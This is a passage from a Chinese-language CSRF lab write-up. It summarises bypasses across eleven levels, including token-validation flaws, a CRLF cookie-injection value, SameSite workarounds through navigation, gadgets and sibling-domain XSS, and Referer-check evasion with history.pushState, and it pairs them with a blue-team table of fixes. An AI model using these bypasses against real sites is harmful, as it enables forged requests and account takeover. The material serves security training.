② 页面执行 history.pushState("", "", "/?主站域名")
    → 当前 URL 被改写，包含主站域名
    ▼
③ 表单自动提交 → Referer = 改写后的 URL（含主站域名）
    ▼
④ 服务器做"包含匹配" → 通过 ✅ → 邮箱被改
```

收官！

# 总结

红队视角：

| 防御             | 打通方式                                                     | 关卡        |
| ---------------- | ------------------------------------------------------------ | ----------- |
| **无防御**       | 直接伪造请求（表单自动提交 / `<img>` 发 GET）                | 第 1 关     |
| **CSRF token**   | ① 只验 POST → 换 GET <br />② 缺席放行 → 整个删掉参数 <br />③ 验真伪不验归属 → 用自己领的**真 token**（不绑 session） <br />④ 绑到独立 csrfKey cookie → CRLF 注入**种 cookie**（`/?search=x%0d%0aSet-Cookie:...`）+ 自己的 token <br />⑤ cookie 与参数重复（double submit，服务器不记账）→ **编一个值** + 种同名 cookie | 第 2~6 关   |
| **SameSite**     | ① Lax 拦 POST 但放行顶级 GET 导航 → `document.location` 顶级导航 + `_method=POST` 参数覆盖<br /> ② Strict 连导航都拦 → 借**站内 gadget**（确认页 JS 用 postId 拼跳转 + `../..` 路径穿越）让目标站自己发起<br /> ③ Strict 墙只砌到 Site 层 → **兄弟域**反射 XSS 当跳板（同 Site 发起 Cookie 照带）+ CSWSH + Collaborator 外带 | 第 7~9 关   |
| **Referer 校验** | ① 缺席放行 → 页面加 `<meta name="referrer" content="no-referrer">` 让请求裸奔<br /> ② 全文包含匹配 → `history.pushState` 把主站域名种进 URL，配合 `Referrer-Policy: unsafe-url` 保住查询串 | 第 10~11 关 |

蓝队视角：

| 防御       | 翻车根源                     | 正确实现                                                     |
| ---------- | ---------------------------- | ------------------------------------------------------------ |
| CSRF token | 降级放行 / 绑错对象          | **无条件强制验证** + 服务端存储、**与 session 一一绑定**、随机足够大 |
| SameSite   | 墙只砌到 Site 层             | Strict/Lax 只做**兜底**；警惕同 Site 兄弟子域；WebSocket 握手校验 Origin |
| Referer    | 字符串匹配 / 缺席放行        | **解析出来源域，精确等于**才放行；**没有 Referer 也拒绝**    |
| 方法与语义 | GET 也能改数据、框架方法覆盖 | 改数据的接口只认 POST、禁用 `_method` 类覆盖                 |

